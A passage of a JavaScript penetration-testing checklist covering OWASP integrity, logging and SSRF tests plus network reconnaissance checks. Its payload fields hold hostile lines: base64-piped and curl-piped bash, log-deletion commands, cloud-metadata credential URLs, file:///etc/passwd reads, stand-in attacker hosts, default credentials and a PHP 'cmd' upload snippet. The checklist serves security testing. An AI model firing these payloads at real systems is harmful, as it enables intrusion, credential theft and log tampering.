      "tools": "MITMproxy, Burp Suite, Code-sign checks (signtool, jarsigner)",
      "critical": true
    },
    {
      "id": "INTEGRITY-002",
      "name": "Insecure Deserialization",
      "page": "API endpoints accepting serialized objects, session storage",
      "description": "Determine if untrusted serialized data is processed without integrity validation, leading to RCE or logic abuse.",
      "howToTest": "Replay requests with gadget-chain payloads generated via ysoserial; look for DNS callbacks or command execution.",
      "payloads": ["Java ysoserial CommonsCollections1", "PHP -O:evil 1:{}"],
      "tools": "ysoserial, Burp Collaborator, Custom gadget scripts",
      "critical": true
    },

    /* ---------- NEW TESTS (INTEGRITY-003 ➜ INTEGRITY-020) ---------- */
    {
      "id": "INTEGRITY-003",
      "name": "Malicious Dependency Injection (Typosquatting)",
      "page": "Build pipelines using npm / PyPI / RubyGems",
      "description": "Assess if CI/CD pulls packages solely by name without checksum or vendor registry, enabling typosquat takeover.",
      "howToTest": "Publish benign package with look-alike name in public registry; trigger build and observe download.",
      "payloads": ["expresss 4.17.1", "reqeust 2.88.2"],
      "tools": "npm audit, Socket.dev, custom registry monitoring",
      "critical": true
    },
    {
      "id": "INTEGRITY-004",
      "name": "Improper Signature Validation Logic",
      "page": "Auto-update agents, mobile app stores",
      "description": "Check if update client validates only presence of signature—not issuer, chain or timestamp.",
      "howToTest": "Sign package with self-signed cert; host on attacker CDN; observe acceptance.",
      "payloads": ["Fake-signed .msi", "APK with debug keystore"],
      "tools": "openssl, jarsigner, MITMproxy",
      "critical": true
    },
    {
      "id": "INTEGRITY-005",
      "name": "CI/CD Pipeline Secrets Exposure",
      "page": "GitHub Actions, GitLab CI, Jenkinsfiles",
      "description": "Identify plaintext API keys or signing secrets committed to repos or visible in CI job logs.",
      "howToTest": "Search history with truffleHog / git-secret-scanner; inspect build logs for secrets redaction issues.",
      "payloads": ["AWS_ACCESS_KEY_ID=", "-----BEGIN PRIVATE KEY-----"],
      "tools": "truffleHog, git-secrets, GitGuardian",
      "critical": true
    },
    {
      "id": "INTEGRITY-006",
      "name": "Unsigned Container Images",
      "page": "Kubernetes deployments, Docker Compose files",
      "description": "Determine if images are pulled from registries without Notary / Cosign signatures or digest pinning.",
      "howToTest": "Push altered image with same tag to public registry; redeploy and see if cluster pulls attacker image.",
      "payloads": ["image: myapp:latest", "helm set image.tag=latest"],
      "tools": "Cosign, Trivy, kube-audit",
      "critical": true
    },
    {
      "id": "INTEGRITY-007",
      "name": "Improper Git Commit Verification",
      "page": "Monorepos with protected branches",
      "description": "Check if merge rules fail to enforce GPG-signed commits, allowing history tampering.",
      "howToTest": "Push unsigned commit via force-push to feature branch; open PR; verify pipeline passes.",
      "payloads": ["git config commit.gpgsign false"],
      "tools": "Git client, Repo settings review",
      "critical": false
    },
    {
      "id": "INTEGRITY-008",
      "name": "Artifact Repository Anonymous Upload",
      "page": "Nexus / Artifactory / Harbor endpoints",
      "description": "Validate whether unauthenticated users can upload or overwrite artifacts in internal registry.",
      "howToTest": "POST a small dummy artifact without credentials; poll registry index for presence.",
      "payloads": ["PUT /repository/maven-releases/com/evil/pwn/1.0/pwn-1.0.jar"],
      "tools": "curl, RepoCLI tools",
      "critical": true
    },
    {
      "id": "INTEGRITY-009",
      "name": "Tamperable JavaScript CDN Links (No SRI)",
      "page": "Public HTML templates",
      "description": "Verify that external `<script>` tags lack Sub-Resource-Integrity hashes, enabling silent content swap.",
      "howToTest": "Intercept response, inject alert(1); reload page, check execution.",
      "payloads": ["<script src=\"https://cdn.example/js/vue.js\"></script>"],
      "tools": "Burp Suite, srihash.org",
      "critical": false
    },
    {
      "id": "INTEGRITY-010",
      "name": "Package Manifest Tampering in Transit",
      "page": "`requirements.txt`, `package-lock.json` downloads via HTTP",
      "description": "Inspect if manifests are fetched over plaintext HTTP allowing MITM injection.",
      "howToTest": "ARP-spoof in CI subnet, alter manifest to add attacker lib; observe build.",
      "payloads": ["http://pypi.org/simple/"],
      "tools": "Bettercap, Wireshark, Burp",
      "critical": true
    },
    {
      "id": "INTEGRITY-011",
      "name": "Hidden Build-Time Malware (Obfuscated Script)",
      "page": "Dockerfile RUN lines, npm preinstall scripts",
      "description": "Search for obfuscated or base64-encoded commands executed during build that could insert backdoors.",
      "howToTest": "Review Dockerfile / `scripts` section; decode base64 and analyze.",
      "payloads": ["RUN echo JHNlY3JldD0= | base64 -d | bash"],
      "tools": "grep, decode-scripts, Dockle",
      "critical": true
    },
    {
      "id": "INTEGRITY-012",
      "name": "Unsigned Mobile Application (No APK/IPA Integrity)",
      "page": "Android / iOS distribution channels outside stores",
      "description": "Ensure APKs are signed with release keystore and IPA with valid provisioning profile.",
      "howToTest": "Download app, verify signature with `apksigner verify` or `codesign -vv`; attempt repack & resign with debug cert.",
      "payloads": ["apktool d app.apk && apktool b && jarsigner …"],
      "tools": "apktool, apksigner, ldid, codesign",
      "critical": true
    },
    {
      "id": "INTEGRITY-013",
      "name": "Improper Checksums on Update Metadata",
      "page": "Yum/Apt repos, custom update JSON feeds",
      "description": "Check if checksums are missing or not validated, enabling malicious mirror injection.",
      "howToTest": "Serve modified package + fake checksum; watch client accept.",
      "payloads": ["repomd.xml with forged SHA1", "apt Packages.gz altered"],
      "tools": "apt-mirror, yum-repomodify",
      "critical": true
    },
    {
      "id": "INTEGRITY-014",
      "name": "Unprotected Infrastructure-as-Code (IaC) States",
      "page": "Terraform state files, CloudFormation templates",
      "description": "Sensitive outputs/state may be stored unencrypted or publicly accessible, allowing tampering.",
      "howToTest": "Search S3 buckets / Git history for `terraform.tfstate`; attempt unauthorized edits and apply.",
      "payloads": ["\"aws_access_key_id\":", "\"db_password\": \"plaintext\""],
      "tools": "tfsec, Checkov, S3Scanner",
      "critical": true
    },
    {
      "id": "INTEGRITY-015",
      "name": "Unsigned Firmware Images",
      "page": "IoT devices, routers, embedded appliances",
      "description": "Determine whether devices accept firmware without digital signature or with weak CRC only.",
      "howToTest": "Craft minimal firmware header, flash via web-admin; validate that device boots attacker build.",
      "payloads": ["Fake-header.bin", "CRC32-only checksum"],
      "tools": "Binwalk, Firmware-Mod-Kit",
      "critical": true
    },
    {
      "id": "INTEGRITY-016",
      "name": "Dev Dependencies Deployed to Production",
      "page": "`node_modules` / `requirements` containing dev-only packages (e.g., test runners)",
      "description": "Excess dependencies bloat attack surface and may include vulnerable code.",
      "howToTest": "Compare runtime container manifest against `prod` dependency list; flag dev packages.",
      "payloads": ["mocha", "pytest", "@types/*"],
      "tools": "npm prune --production, pip-deptree",
      "critical": false
    },
    {
      "id": "INTEGRITY-017",
      "name": "Build Cache Poisoning (Shared Artifact Cache)",
      "page": "CI servers with shared Maven/NPM caches",
      "description": "Poison cache with malicious artifact so other builds consume tampered binary.",
      "howToTest": "Upload crafted JAR to shared volume; trigger downstream build; inspect artifact hash.",
      "payloads": ["evil-commons-1.0.jar"],
      "tools": "Maven repository manager UI, Hash shasum",
      "critical": true
    },
    {
      "id": "INTEGRITY-018",
      "name": "Insecure Object Storage Signed URLs",
      "page": "Pre-signed S3/Blob URLs in client apps",
      "description": "Check if URLs use long expiration or world-readable ACLs, enabling file tampering.",
      "howToTest": "Capture URL from traffic; attempt PUT/DELETE; extend expiry field if token is JWT/plain.",
      "payloads": ["X-Amz-Expires=604800", "sig=0000"],
      "tools": "AWS CLI, Burp, curl",
      "critical": false
    },
    {
      "id": "INTEGRITY-019",
      "name": "Improper Package Hash Verification in Installer",
      "page": "Bootstrap scripts (`curl | bash`, homebrew formulas)",
      "description": "Installer downloads tarball and verifies only file size or HTTP status, not cryptographic hash.",
      "howToTest": "DNS hijack to serve altered tarball; observe installer success.",
      "payloads": ["curl https://install.example.sh | bash"],
      "tools": "Bettercap, DNS spoofing",
      "critical": true
    },
    {
      "id": "INTEGRITY-020",
      "name": "Misconfigured SigStore/Cosign Policy",
      "page": "Kubernetes admission controllers",
      "description": "Policy allows images with any or missing signatures to run in production.",
      "howToTest": "Push unsigned image tag; deploy via kubectl; verify admission did not block.",
      "payloads": ["myrepo/internal/app:dev-unsigned"],
      "tools": "Cosign, Kyverno policy test, kubectl",
      "critical": true
    }
  ],
  "OWASP A09 - Security Logging Failures": [
    {
      "id": "LOG-001",
      "name": "Insufficient Logging of Security Events",
      "page": "Authentication systems, access control mechanisms, admin functions",
      "description": "Test if security-relevant events are properly logged and monitored for incident response.",
      "howToTest": "Perform various security-relevant actions and check if they are properly logged. Test log tampering possibilities.",
      "payloads": ["Authentication attempts", "Authorization failures", "Admin actions", "Suspicious activities"],
      "tools": "Log analysis tools, Manual log review, Security monitoring tools",
      "critical": false
    },
 {
      "id": "LOG-002",
      "name": "Missing Log Retention Policy",
      "page": "Log storage servers, cloud log buckets",
      "description": "Ascertain whether logs are kept for a period that satisfies incident-response and regulatory needs.",
      "howToTest": "Review retention settings; trigger events, then verify they are still present after expected retention window.",
      "payloads": ["Generate test error at T0, check at T+30d"],
      "tools": "Log management UI, CLI retention queries",
      "critical": false
    },
    {
      "id": "LOG-003",
      "name": "Insecure Log Storage (Tampering)",
      "page": "Local log files, centralized log servers",
      "description": "Determine ifs attackers can alter or delete logs to cover tracks.",
      "howToTest": "Attempt to modify or truncate log files with compromised account or limited OS privileges.",
      "payloads": ["echo > /var/log/app.log", "DELETE FROM logs WHERE …"],
      "tools": "Shell access, database client, file-integrity checker",
      "critical": true
    },
{
      "id": "LOG-004",
      "name": "Sensitive Data Exposed in Logs",
      "page": "Application, access, and error logs",
      "description": "Check if passwords, tokens, credit-card numbers or PII appear in plain text within logs.",
      "howToTest": "Search logs for regex patterns matching secrets; inspect stack traces for request bodies.",
      "payloads": ["regex: (Bearer\\s+[A-Za-z0-9_\\-]+)", "regex: \\d{16}"],
      "tools": "grep, log scanners, secrets-detection tools",
      "critical": true
    },
    {
      "id": "LOG-005",
      "name": "Unstructured / Inconsistent Log Format",
      "page": "Distributed services producing logs",
      "description": "Identify whether logs lack consistent timestamps, levels, or JSON structure, making correlation hard.",
      "howToTest": "Collect samples from multiple services; evaluate schema consistency and ISO-8601 timestamp usage.",
      "payloads": ["INFO 2025-08-25 user=123", "{\"level\":\"info\",\"ts\":...}"],
      "tools": "jq, ELK stack parsers, manual review",
      "critical": false
    },
 {
      "id": "LOG-006",
      "name": "Lack of Centralized Logging",
      "page": "Microservices, container clusters",
      "description": "Confirm that logs from all nodes and pods are shipped to a central store for search and alerting.",
      "howToTest": "Kill a pod or trigger error on one node; verify event appears in SIEM.",
      "payloads": ["kubectl exec … echo FAIL"],
      "tools": "kubectl logs, SIEM dash, Log shipping agents",
      "critical": true
    },
    {
      "id": "LOG-007",
      "name": "Ineffective Alerting Rules",
      "page": "SIEM / log-analytics platform",
      "description": "Check if high-risk events generate timely, actionable alerts.",
      "howToTest": "Trigger suspicious activity (e.g., 20 failed logins); confirm whether alert fires and ticket created.",
      "payloads": ["Auth failure flood", "Creation of new admin user"],
      "tools": "SIEM rule tester, Burp Intruder, custom scripts",
      "critical": true
    },
{
  "id": "LOG-008",
  "name": "Verbose Debug Logging in Production",
  "page": "Application servers with DEBUG level",
  "description": "Locate debug/trace logs that disclose stack traces, queries, or environment variables.",
  "howToTest": "Send malformed requests to trigger exceptions; inspect returned logs or log files.",
  "payloads": ["{{7*7}}", "%"],
  "tools": "Burp Repeater, log viewer",
  "critical": false
},
  {
      "id": "LOG-009",
      "name": "Log Injection / Log Forgery",
      "page": "User-supplied input recorded in logs",
      "description": "Test if CRLF, ANSI codes, or JSON control chars injected by attacker corrupt log integrity.",
      "howToTest": "Submit payload that injects new line or fake entry; verify alteration in log viewer.",
      "payloads": ["username=%0a%0dWARN:User=hacker", "\\u001b[31mERROR\\u001b[0m"],
      "tools": "Burp Suite, tail -f, log analyzers",
      "critical": true
    },
{
      "id": "LOG-010",
      "name": "Missing Time Synchronization",
      "page": "Distributed systems relying on NTP",
      "description": "Determine if log timestamps differ significantly across hosts, complicating incident timelines.",
      "howToTest": "Compare current time in logs from multiple servers; assess NTP configuration.",
      "payloads": ["date +%s on each host"],
      "tools": "ntpq, chronyc, SIEM correlation view",
      "critical": false
    },
 {
      "id": "LOG-011",
      "name": "API Logging Blind Spots",
      "page": "GraphQL, gRPC or REST micro-APIs",
      "description": "Verify whether successful and failed API calls—including payloads—are captured with user context.",
      "howToTest": "Invoke API with invalid/malformed body and check whether event exists in central logs.",
      "payloads": ["POST /api/orders {\"price\":-1}"],
      "tools": "Postman, ELK stack queries",
      "critical": true
    },
{
      "id": "LOG-012",
      "name": "Client-Side Errors Not Logged Server-Side",
      "page": "Single-page applications (React/Vue/Angular)",
      "description": "Check if front-end JavaScript errors are sent to back-end for monitoring.",
      "howToTest": "Trigger console error; inspect network for error beacon; confirm entry in server logs.",
      "payloads": ["throw new Error('test')"],
      "tools": "Browser DevTools, log collector",
      "critical": false
    },
    {
      "id": "LOG-013",
      "name": "Disabled Audit Trail on Sensitive Tables",
      "page": "Database layers containing financial or PII data",
      "description": "Ensure CRUD operations on critical tables generate audit records.",
      "howToTest": "Insert/update/delete sample rows; query audit schema for corresponding entries.",
      "payloads": ["UPDATE accounts SET balance=0 WHERE id=1"],
      "tools": "SQL client, database audit views",
      "critical": true
    },
{
      "id": "LOG-014",
      "name": "No Monitoring of Privileged Account Activity",
      "page": "Admin consoles, sudo logs, cloud root accounts",
      "description": "Validate that elevated actions are logged and produce real-time alerts.",
      "howToTest": "Login as admin or use sudo to change settings; watch SIEM for alert.",
      "payloads": ["sudo su -", "aws iam create-user --user-name evil"],
      "tools": "CloudTrail, Linux auditd, SIEM",
      "critical": true
    },
    {
      "id": "LOG-015",
      "name": "No Alert on Excessive Login Failures",
      "page": "Authentication endpoints",
      "description": "Determine if repetitive failed logins trigger alerts to security operations.",
      "howToTest": "Automate 50+ wrong-password attempts; monitor alert channels.",
      "payloads": ["username=target, password=guess*"],
      "tools": "Hydra, Burp Intruder, SIEM",
      "critical": false
    },
{
      "id": "LOG-016",
      "name": "Logs Not Write-Once (WORM)",
      "page": "Filesystem or object storage hosting logs",
      "description": "Assess if attackers with limited access can overwrite or delete existing log entries.",
      "howToTest": "Attempt chmod/chown or DELETE on log files or S3 objects; observe success.",
      "payloads": ["rm /var/log/app.log", "aws s3 rm s3://logs/2025/08/25/*.gz"],
      "tools": "Shell, AWS CLI, forensic file-system checks",
      "critical": true
    },
    {
      "id": "LOG-017",
      "name": "External Service Logs Not Integrated",
      "page": "Third-party SaaS, payment gateways, auth providers",
      "description": "Confirm logs from external dependencies feed into central monitoring.",
      "howToTest": "Generate event (e.g., failed Stripe payment); verify appearance in SIEM.",
      "payloads": ["$0 test charge"],
      "tools": "Service dashboards, SIEM connectors",
      "critical": false
    },
    {
      "id": "LOG-018",
      "name": "Alert Fatigue / Excessive Noise",
      "page": "SIEM / SOC alerting channels",
      "description": "Review whether high alert volume hides true positives, causing analysts to ignore alerts.",
      "howToTest": "Count daily alert volume; verify tuning thresholds and deduplication rules.",
      "payloads": ["Generate benign scan traffic repeatedly"],
      "tools": "SIEM metrics, reporting APIs",
      "critical": false
    },
{
      "id": "LOG-019",
      "name": "Logs Not Encrypted in Transit",
      "page": "Log forwarders shipping over syslog/TCP or HTTP",
      "description": "Check if plaintext channels expose sensitive log data to network sniffing.",
      "howToTest": "Capture traffic on log port; inspect for readable messages.",
      "payloads": ["tcpdump -A port 514", "wireshark filter tcp.port==9200"],
      "tools": "tcpdump, Wireshark, Zeek",
      "critical": true
    },
    {
      "id": "LOG-020",
      "name": "Log Ingestion / Parsing Failures",
      "page": "ETL pipelines, Logstash, Fluentd rules",
      "description": "Identify malformed entries that break parsing and create blind spots.",
      "howToTest": "Send log lines missing expected delimiters or with huge JSON; confirm drop or parsing error metric.",
      "payloads": ["{\"msg\":\"unclosed", "a|b|c|d|e|f|g (missing fields)"],
      "tools": "Fluentd monitor, Kibana ingest stats, custom fuzzers",
      "critical": false
    }
  ],
 "OWASP A10 - Server-Side Request Forgery (SSRF)": [
    {
      "id": "SSRF-001",
      "name": "Basic Internal IP SSRF",
      "page": "URL-fetch features (import by URL, webhooks, image preview)",
      "description": "Test if the application fetches attacker-supplied URLs that point to RFC-1918 or loopback addresses.",
      "howToTest": "Submit URLs such as http://127.0.0.1 or http://10.0.0.1:80 and observe response bodies, timing or DNS/HTTP callbacks.",
      "payloads": ["http://127.0.0.1", "http://10.0.0.1:80", "http://192.168.0.1/api"],
      "tools": "Burp Collaborator, curl, ffuf",
      "critical": true
    },
    {
      "id": "SSRF-002",
      "name": "Cloud Metadata Harvesting (AWS)",
      "page": "Any user-controlled URL parameter in cloud-hosted app",
      "description": "Attempt to retrieve AWS EC2 Instance Metadata to obtain IAM credentials.",
      "howToTest": "Point the feature to http://169.254.169.254/latest/meta-data/iam/security-credentials/ and check if JSON credentials are returned.",
      "payloads": ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
      "tools": "Burp Suite, HTTP client, AWS CLI",
      "critical": true
    },
    {
      "id": "SSRF-003",
      "name": "Gopher Protocol Payload Injection",
      "page": "URL importers that allow non-HTTP schemes",
      "description": "Use gopher:// to craft raw TCP requests that reach internal services (e.g., Redis, MySQL).",
      "howToTest": "Submit a gopher URL encoding the target protocol conversation (e.g., *PING* to Redis) and watch for behavioural changes.",
      "payloads": ["gopher://127.0.0.1:6379/_PING"], 
      "tools": "gopherus, Burp Repeater",
      "critical": true
    },
    {
      "id": "SSRF-004",
      "name": "file:// Scheme Local File Read",
      "page": "PDF generators, image converters, XML parsers",
      "description": "Check if the application dereferences file:// URIs and returns server-side file content.",
      "howToTest": "Pass file:///etc/passwd or Windows equivalents and inspect output for file data.",
      "payloads": ["file:///etc/passwd", "file:///C:/Windows/win.ini"],
      "tools": "curl, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-005",
      "name": "URL Path Traversal Bypass",
      "page": "Endpoints that prepend/append fixed hostnames",
      "description": "Use path traversal (../) to break out of fixed base URL and access arbitrary hosts.",
      "howToTest": "If application prefixes https://safe/, supply ../../169.254.169.254/latest/meta-data.",
      "payloads": ["../../169.254.169.254/latest/meta-data/"],
      "tools": "Browser, Burp Suite",
      "critical": false
    },
    {
      "id": "SSRF-006",
      "name": "DNS Rebinding to Bypass Host Allowlist",
      "page": "URL downloaders that resolve hostnames once and cache",
      "description": "Serve attacker-controlled domain that first resolves to external IP (allowlist passes) then rebinds to internal IP.",
      "howToTest": "Use dnsrebind․tool to serve payload.domain with A-record flip; trigger second request after TTL expiry.",
      "payloads": ["http://rebind.attacker.com"],
      "tools": "DNSRebind, Burp Collaborator",
      "critical": true
    },
    {
      "id": "SSRF-007",
      "name": "Protocol Smuggling via @ Character",
      "page": "Libraries that strip credentials before making request",
      "description": "Inject userinfo@hostname to trick parsers into connecting to internal host while validation sees external.",
      "howToTest": "Submit http://allowed.com@127.0.0.1/admin and monitor for internal connection.",
      "payloads": ["http://example.com@127.0.0.1/"],
      "tools": "curl, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-008",
      "name": "Obfuscated IP Address Formats",
      "page": "URL validators with naive regex",
      "description": "Use integer, octal, hex or mixed-base encodings to bypass filters blocking 127.0.0.1.",
      "howToTest": "Try http://2130706433 or http://0x7f000001 and verify connection to localhost.",
      "payloads": ["http://2130706433", "http://0x7f000001", "http://0177.0.0.1"],
      "tools": "Burp Suite, ipcalc",
      "critical": true
    },
    {
      "id": "SSRF-009",
      "name": "Redirect-Follow SSRF",
      "page": "Fetchers that follow 3XX without validation",
      "description": "Point to external benign URL that issues 302 redirect to internal host; check if server follows.",
      "howToTest": "Control attacker.com/redirect that returns Location: http://localhost:8000.",
      "payloads": ["http://attacker.com/redirect"],
      "tools": "ngrok, Burp Collaborator",
      "critical": false
    },
    {
      "id": "SSRF-010",
      "name": "Open Proxy Misuse",
      "page": "Applications honouring HTTP_PROXY / https_proxy env vars",
      "description": "Set proxy env variable via headers (e.g., Proxy header in FastCGI) to route outbound requests through attacker proxy.",
      "howToTest": "Inject HTTP_PROXY=http://attacker:8080; observe hijacked traffic.",
      "payloads": ["Proxy: http://evil:8080"],
      "tools": "mitmproxy, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-011",
      "name": "SSRF via PDF Renderer",
      "page": "Features converting HTML → PDF",
      "description": "Embed <img src> or @import CSS pointing to internal resource; render engine fetches during conversion.",
      "howToTest": "Upload HTML containing <img src=\"http://127.0.0.1:8000/secret\" > and monitor hits.",
      "payloads": ["<img src=\"http://169.254.169.254/latest/meta-data/\">"],
      "tools": "Burp Collaborator, wkhtmltopdf PoC",
      "critical": true
    },
    {
      "id": "SSRF-012",
      "name": "Blind SSRF—DNS Callback",
      "page": "Any URL fetcher that returns generic error/timeout",
      "description": "Use unique sub-domain and observe DNS lookup to confirm outbound request without needing response body.",
      "howToTest": "Supply http://<unique>.oast.live; check DNS query logs.",
      "payloads": ["http://ssrf.<collaborator>.burpcollaborator.net"],
      "tools": "Burp Collaborator, Interact-sh",
      "critical": true
    },
    {
      "id": "SSRF-013",
      "name": "IPv6 Bypass",
      "page": "Whitelist filters only IPv4 ranges",
      "description": "Use IPv6 localhost ::1 or encoded variants to reach internal interface.",
      "howToTest": "Submit http://[::1]:80 or http://0:0:0:0:0:0:0:1.",
      "payloads": ["http://[::1]/", "http://0:0:0:0:0:0:0:1/"],
      "tools": "curl, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-014",
      "name": "CRLF Injection into Host Header (HTTP Smuggling)",
      "page": "Raw socket fetch libraries",
      "description": "Inject %0d%0a to craft second request to internal host, piggy-backed on first.",
      "howToTest": "Encode payload in path: /%0d%0aGET http://169.254.169.254/latest/meta-data/ HTTP/1.1%0d%0aHost:",
      "payloads": ["/%0d%0aGET%20http://localhost/ HTTP/1.1%0d%0aHost:%20"],
      "tools": "Burp Repeater, custom Python socket script",
      "critical": true
    },
    {
      "id": "SSRF-015",
      "name": "HTTP Verb Smuggling (CONNECT)",
      "page": "Proxy-aware servers that permit CONNECT method",
      "description": "Use CONNECT to ask server to open raw TCP tunnel to internal host.",
      "howToTest": "Send CONNECT 127.0.0.1:22 HTTP/1.1 via vulnerable endpoint and check for 200 Connection Established.",
      "payloads": ["CONNECT 127.0.0.1:22 HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n"],
      "tools": "nc, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-016",
      "name": "SSRF via CRON Fetch (Scheduled Imports)",
      "page": "Periodic feed importers (RSS, JSON feeds)",
      "description": "Register feed URL pointing to attacker server that later redirects to internal resource.",
      "howToTest": "Add malicious feed, wait for cron job; monitor internal traffic.",
      "payloads": ["http://attacker.com/internalfeed"],
      "tools": "Burp Collaborator, server logs",
      "critical": false
    },
    {
      "id": "SSRF-017",
      "name": "Local Port Scanning Through Response Timing",
      "page": "Any SSRF primitive with observable timing",
      "description": "Measure response delays to map open/closed ports inside the network.",
      "howToTest": "Iterate target.com:1-65535; open ports respond quickly, closed time-out or differ.",
      "payloads": ["http://127.0.0.1:22", "http://127.0.0.1:3306"],
      "tools": "curl, ffuf, race-condition scripts",
      "critical": false
    },
    {
      "id": "SSRF-018",
      "name": "GraphQL URL Field SSRF",
      "page": "GraphQL mutations that accept image/url fields",
      "description": "Submit internal URLs via GraphQL variables to coerce server fetch.",
      "howToTest": "Craft mutation {upload(url:\"http://169.254.169.254/\"){id}} and observe callback.",
      "payloads": ["mutation{pic:url \"http://localhost/admin\"}"],
      "tools": "InQL, Burp Suite",
      "critical": true
    },
    {
      "id": "SSRF-019",
      "name": "Swagger/OpenAPI Try-It Console SSRF",
      "page": "Swagger UI exposed to internet",
      "description": "Use built-in API explorer to hit internal-only endpoints via gateway.",
      "howToTest": "Open /swagger and execute GET /admin/internal?url=http://127.0.0.1.",
      "payloads": ["{\"url\":\"http://127.0.0.1/metrics\"}"],
      "tools": "Browser, Burp",
      "critical": false
    },
    {
      "id": "SSRF-020",
      "name": "SSRF via PDF ‘file:///’ URI in CSS @font-face",
      "page": "HTML-to-PDF engines that load external fonts",
      "description": "Embed @font-face with src:url(file:///etc/passwd) and check if contents leak as font parsing error.",
      "howToTest": "Upload HTML containing malicious @font-face rule; parse error logs or output.",
      "payloads": ["@font-face{font-family:x;src:url(file:///etc/passwd);}"],
      "tools": "wkhtmltopdf, Prince, Burp Suite",
      "critical": true
    }
  ],
"Additional Checkes": [
  {
    "id": "ADD-001",
    "name": "Host Discovery",
    "page": "Network Layer/IP/URL",
    "description": "Identify if the target IP is live and reachable.",
    "howToTest": "Use ICMP ping or TCP SYN scan.",
    "payloads": ["nmap -sn <IP>", "ping <IP>", "fping <IP>"],
    "tools": "Nmap, Masscan, fping",
    "critical": true
  },
  {
    "id": "ADD-002",
    "name": "Full Port Scan",
    "page": "Network Layer/IP/URL",
    "description": "Scan all 65535 ports to identify open services.",
    "howToTest": "Run a full TCP SYN scan.",
    "payloads": ["nmap -p- -sS <IP>", "masscan <IP> -p0-65535"],
    "tools": "Nmap, Masscan",
    "critical": true
  },
  {
    "id": "ADD-003",
    "name": "Service Enumeration",
    "page": "Network Layer/IP/URL",
    "description": "Identify service versions and banners.",
    "howToTest": "Use version detection and banner grabbing.",
    "payloads": ["nmap -sV <IP>", "curl -I <IP>:<port>", "nc <IP> <port>"],
    "tools": "Nmap, Netcat, Curl",
    "critical": true
  },
  {
    "id": "ADD-004",
    "name": "Operating System Fingerprinting",
    "page": "Network Layer/IP/URL",
    "description": "Determine the OS running on the target host.",
    "howToTest": "Use TCP/IP stack fingerprinting.",
    "payloads": ["nmap -O <IP>"],
    "tools": "Nmap, Xprobe2",
    "critical": false
  },
  {
    "id": "ADD-005",
    "name": "DNS Enumeration",
    "page": "Network Layer/IP/URL",
    "description": "Enumerate DNS records and subdomains.",
    "howToTest": "Use zone transfer and brute-force techniques.",
    "payloads": ["dig axfr @<IP>", "dnsenum <domain>", "sublist3r <domain>"],
    "tools": "Dig, DNSenum, Sublist3r",
    "critical": true
  },
  {
    "id": "ADD-006",
    "name": "SSL/TLS Configuration Check",
    "page": "Web Services/IP/URL",
    "description": "Identify weak SSL/TLS ciphers and expired certificates.",
    "howToTest": "Scan HTTPS ports for SSL issues.",
    "payloads": ["testssl.sh <IP>", "sslyze <IP>","sslscan<URL>"],
    "tools": "testssl.sh, sslyze, OpenSSL,sslscan",
    "critical": true
  },
  {
    "id": "ADD-007",
    "name": "Web Server Fingerprinting",
    "page": "Web Services/IP/URL",
    "description": "Identify technologies and frameworks used by the web server.",
    "howToTest": "Use HTTP header analysis and fingerprinting tools.",
    "payloads": ["curl -I <IP>", "whatweb <IP>", "nmap -p80,443 -sV <IP>"],
    "tools": "WhatWeb, Wappalyzer, Nmap",
    "critical": true
  },
  {
    "id": "ADD-008",
    "name": "Directory and File Enumeration (optional)",
    "page": "Web Services/IP/URL",
    "description": "Discover hidden directories and files on web servers.",
    "howToTest": "Use wordlists to brute-force paths.",
    "payloads": ["ffuf -u http://<IP>/FUZZ -w wordlist.txt", "dirsearch -u http://<IP>"],
    "tools": "FFUF, Dirsearch, Gobuster",
    "critical": true
  },
  {
    "id": "ADD-009",
    "name": "Virtual Host Enumeration (optional)",
    "page": "Web Services/IP/URL",
    "description": "Identify virtual hosts configured on the server.",
    "howToTest": "Use host header fuzzing.",
    "payloads": ["ffuf -H 'Host: FUZZ.<IP>' -u http://<IP> -w subdomains.txt"],
    "tools": "FFUF, Burp Suite, VHostScan",
    "critical": false
  },
  {
    "id": "ADD-010",
    "name": "Firewall and IDS Detection (optional)",
    "page": "Network Layer/IP/URL",
    "description": "Detect presence of firewalls or intrusion detection systems.",
    "howToTest": "Use packet timing and response analysis.",
    "payloads": ["nmap --script firewall-bypass <IP>", "hping3 -S <IP> -p <port>"],
    "tools": "Nmap, Hping3, Xprobe2",
    "critical": false
  },
       {
      "id": "ADD-011",
      "name": "Login Brute-Forcing",
      "page": "Login Page",
      "description": "Try to bruteforce a login page to confirm account lockout after 10 attempts.",
      "howToTest": "Use any Bruteforcing tool.",
      "payloads": ["admin : admin" ,"root : root" , "guest : guest" , "administrator : administrator"],
      "tools": "ffuf, Hydra, Burp Suite",
      "critical": true
    },
 {
      "id": "ADD-012",
      "name": "Login with GET method",
      "page": "Login Page",
      "description": "Check if the login form uses the GET method, which can expose credentials in browser history, logs, and referrer headers.",
      "howToTest": "Inspect the login form method using browser dev tools or Burp Suite. Attempt login and observe if credentials appear in the URL",
      "payloads": ["https://example.com/login?username=admin&password=admin" ,"root : root" , "guest : guest" , "administrator : administrator"],
      "tools": "curl, Burp Suite",
      "critical": false
    },
{
  "id": "ADD-013",
  "name": "Modify Login to GET Method",
  "page": "Login Page",
  "description": "Check if the login form uses the GET method, which can expose credentials in browser history, logs, and referrer headers.",
  "howToTest": "Inspect the login form method using browser dev tools or Burp Suite. Manually change the method to GET and pass credentials in the URL to see if login is successful.",
  "payloads": [
    "GET /login?user=test&pass=test HTTP/1.1",
    "curl \"http://target.com/login?user=test&pass=test\""],
  "tools": "Burp Suite, Browser Dev Tools, Curl",
  "critical": false
},
  {
      "id": "ADD-014",
      "name": "Email Bombing",
      "page": "Login Page, password reset",
      "description": "Email Functionality should not be abused to send unlimited emails.",
      "howToTest": "Send multiple request to same endpoint.",
      "payloads": ["https://www.example.com/resetpassword" , "https://www.example.com/sendemail"],
      "tools": "ffuf, Hydra, Burp Suite",
      "critical": true
    },
  {
      "id": "ADD-015",
      "name": "File Upload Vulnerability",
      "page": "Upload Functionality in a website/API",
      "description": "Verify if server accepts files with .php , .exe , phtml . jpg.php , php.jpg .",
      "howToTest": "Upload exceutable file and try to access it in browser for a webshell.",
      "payloads": ["<?php echo $_GET['cmd']; ?>" , "<?= $_GET['cmd']; ?>"],
      "tools": "ffuf, Hydra, Burp Suite",
      "critical": true
    }
  ]
};
